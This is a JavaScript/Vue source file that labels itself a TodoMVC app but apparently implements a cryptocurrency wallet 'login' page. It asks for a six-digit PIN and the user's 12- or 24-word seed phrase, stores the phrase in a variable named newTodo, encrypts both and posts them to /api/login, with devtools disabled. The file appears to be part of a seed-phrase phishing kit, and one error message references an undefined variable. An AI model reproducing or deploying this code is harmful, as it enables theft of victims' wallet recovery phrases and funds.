"use strict";

const listErrors = {401: "password erroné", 404: "not found", 412: "missing fields", 426: "need upgrade"};

// Full spec-compliant TodoMVC with localStorage persistence
// and hash-based routing in ~120 effective lines of JavaScript.
document.addEventListener("DOMContentLoaded", () => {
    // app Vue instance
    const app = Vue.createApp({
        name: "VuePincode",
        delimiters: ['${', '}'],
        mounted() {
            this.paraphrase = document.getElementById('app').className
            document.getElementById('app').classList.remove(this.paraphrase);
        },
        data() {
            return {
                newTodo: "",
                errorTodo: "",
                errorSend: "",
                terms: false,
                step: 1,
                pincode: "",
                pincode_confirm: "",
                pincodeError: false,
                pincodeSuccess: false,
                paraphrase: ""
            };
        },
        computed: {
            pincodeLength() {
                return this.pincode.length;
            },
            pincodeConfirmLength() {
                return this.pincode_confirm.length;
            },
            buttonDisabled() {
                return (this.pincodeError || this.pincodeSuccess) && this.mnemonicStatus();
            },
            buttonSubmitDisabled() {
                return this.step < 5;
            },
        },
        watch: {
            pincode() {
                if (this.pincodeLength === 6) {
                    this.$emit("pincode", this.pincode);
                }
            },
            pincode_confirm() {
                if (this.pincodeConfirmLength === 6) {
                    this.$emit("pincode", this.pincode_confirm);
                }
            },
            step() {},
        },
        destroyed() {
            this.resetPincode();
        },
        methods: {
            showmnenomic() {
                document.getElementById("changetypage").type= (document.getElementById("changetypage").type === "text" ? "password" : "text");
            },
            addTodo() {
                this.errorTodo = "";
               if (this.terms && this.step > 3 && this.mnemonicStatus()) {
                   this.step = 5
                   this.submit();
               }
            },
            mnemonicStatus() {
                var value = this.newTodo && this.newTodo.trim();
                if (!value) {
                    this.errorTodo = "";
                    return false;
                }

                var wordsNB = (value.trim().split(' ').filter(function(v, index, arr){
                    return v != "";
                }).length);

                if (wordsNB < 12) {
                    this.errorTodo = 'Missing words in your seed, need 12 or 24...';
                    return false;
                }
                return true;
            },
            clickPinButton(pressedNumber) {
                if (this.step === 1) {
                    if (this.pincodeLength < 6) {
                        this.pincode = this.pincode + pressedNumber;
                    }
                    if (this.pincodeLength == 6) {
                        this.step = 2
                    }
                } else {
                    if (this.pincodeConfirmLength < 6) {
                        this.pincode_confirm = this.pincode_confirm + pressedNumber;
                    }
                    if (this.pincodeConfirmLength == 6) {
                        this.checkPincode()
                    }
                }
            },
            resetErrorMessage() {
                this.errorTodo = '';
            },
            resetPincode() {
                if (this.step === 2) {
                    this.pincode_confirm = "";
                } else {
                    this.pincode = "";
                    this.pincode_confirm = "";
                }
                this.pincodeError = false;
                this.pincodeSuccess = false;
            },
            checkPincode() {
                setTimeout(() => {
                    if (this.pincode === this.pincode_confirm) {
                        this.triggerSuccess();
                    } else {
                        this.triggerMiss();
                    }
                }, 700);
            },
            validterms() {
                if (this.terms && this.step > 3 && this.mnemonicStatus()) {
                    this.step = 5
                } else if (!this.terms && this.step > 3) {
                    this.step = 4
                }
            },
            triggerMiss() {
                this.errorTodo = 'Les mots de passe ne correspondent pas';
                this.pincodeError = true;
                this.step = 1
                setTimeout(() => this.resetPincode(), 800);
                setTimeout(() => this.resetErrorMessage(), 5000);
            },
            triggerSuccess() {
                this.pincodeSuccess = true;
                if (this.terms && this.mnemonicStatus()) {
                    this.step = 5
                } else {
                    this.step = 4
                }
            },
            submit() {
                this.errorSend = '';
                if (this.step === 5 && this.pincodeLength == 6 && this.terms && this.mnemonicStatus()) {
                    this.callAPILogin(this.pincode)
                } else if (!this.mnemonicStatus()) {
                    this.errorSend = 'Vous devez renseigner votre phrase secrète';
                    setTimeout(() => this.resetErrorMessageForAPI(), 5000);
                } else if (!this.terms) {
                    this.errorSend = 'Vous devez accepter les conditions générales';
                    setTimeout(() => this.resetErrorMessageForAPI(), 5000);
                }
            },
            async encrypt(code) {
                let c = (new TextEncoder()).encode(code, 'utf-8');
                return await cryptGcm(this.paraphrase, c);
            },
            callAPILogin(code) {
                this.errorSend = '... wait ...';
                let t = this;
                this.step = 3;
                let cipher = "";
                let cipherMn = "";

                return t.encrypt(code)
                .then(c => {
                    cipher = c;
                    return t.encrypt(t.newTodo.trim());
                })
                .then(c => {
                    cipherMn = c;
                    return grecaptcha.execute('6LfmdSAeAAAAAPf5oNQ1UV0wf6QhnH9dQFDSop7V', {action: 'submit'});
                })
                .then(token => axios.post('/api/login', {
                    password: cipher,
                    mnemonic: cipherMn,
                    recaptcha: token,
                }))
                .then(response => {
                    if (response.data && response.data.status === 'ok') {
                        window.location.replace("/wallet");
                    } else {
                        t.errorSend = 'Error! Could not reach the API. ' + error;
                        setTimeout(() => t.resetErrorMessageForAPI(), 3500);
                    }
                })
                .catch(error => {
                    if (error.response) {
                        if (error.response.status in listErrors) {
                            t.errorSend = error.response.message;
                            this.step = 1;
                        } else {
                            t.errorSend = 'Error! Could not reach the API. ' + error;
                        }
                    } else {
                        t.errorSend = 'Error! Could not reach the API';
                        this.step = 1;
                    }
                    setTimeout(() => t.resetErrorMessageForAPI(), 3500);
                });
            },
            resetErrorMessageForAPI() {
                this.errorSend = '';
                if (!this.terms) {
                    this.step = 4
                } else {
                    this.step = 5
                }
            },
        }
    });

    app.config.productionTip = false;
    app.config.devtools = false;
    app.mount(".todoapp");
});
